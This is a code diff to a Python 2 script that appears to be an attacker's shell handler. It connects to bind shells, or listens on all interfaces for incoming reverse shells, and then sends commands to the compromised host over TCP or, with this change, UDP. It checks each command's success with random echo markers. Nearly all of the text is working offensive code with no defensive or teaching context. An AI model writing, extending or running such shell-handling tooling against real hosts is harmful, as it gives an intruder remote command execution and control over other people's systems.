@@ -3,22 +3,27 @@ import paramiko
 import os, sys
 import getpass
 
-# from time import sleep
+from time import sleep
 
 client = None
 ssh = None
+address = None
+
 
 def runSocketCommand( comm ) :
 	canc_rand = os.urandom(4).encode('hex')
 	compl_rand = os.urandom(4).encode('hex')
 	
 	command = ' ' + comm + ' && echo %s || echo %s \n' % ( compl_rand, canc_rand )
-	print "> " + command,
+	# print "> " + command,
+	# try :
 	client.send( command )
+	# client.sendto( command, address )
 	resp = ''
 
 	while compl_rand not in resp and canc_rand not in resp :
-		resp += client.recv( 4096 * 4 )
+		sleep(0.1)
+		resp += client.recvfrom( 4096 * 4 )[0]
 	resp = resp.strip()
 
 	if compl_rand in resp :
@@ -43,26 +48,40 @@ def runSSHCommand( comm ) :
 def get_command_execute ( args ) :
 	global client
 	global ssh
+	global address
+
 	if args.command == "bind" :
-		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		if args.udp :
+			client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		else :
+			client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		address = (args.IP, args.port )
 		client.connect( address )
-		# client.settimeout(2)
 		runCommand = runSocketCommand
 
 
 	elif args.command == "reverse" :
-		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		if args.udp :
+			server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			client = server
+			ip, port = raw_input("IP and port of the remote host [IP:address] : ").strip().split(':')
+			address = ( ip.strip(), int( port.strip()) )
+
+		else :
+			server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
 		server.setsockopt( socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		server.bind( ("0.0.0.0", args.port ) )
 		print "Waiting for the Reverse Shell at port %d" % args.port
+
 		try :
-			server.listen(5)
+			if not args.udp :
+				server.listen(5)
+				client, address = server.accept()
 		except KeyboardInterrupt :
 			print "Aborted by user..."
 			sys.exit(-2)
-		client, address = server.accept()
-		# client.settimeout(2)
+
 		runCommand = runSocketCommand
 
 	elif args.command == "local" :
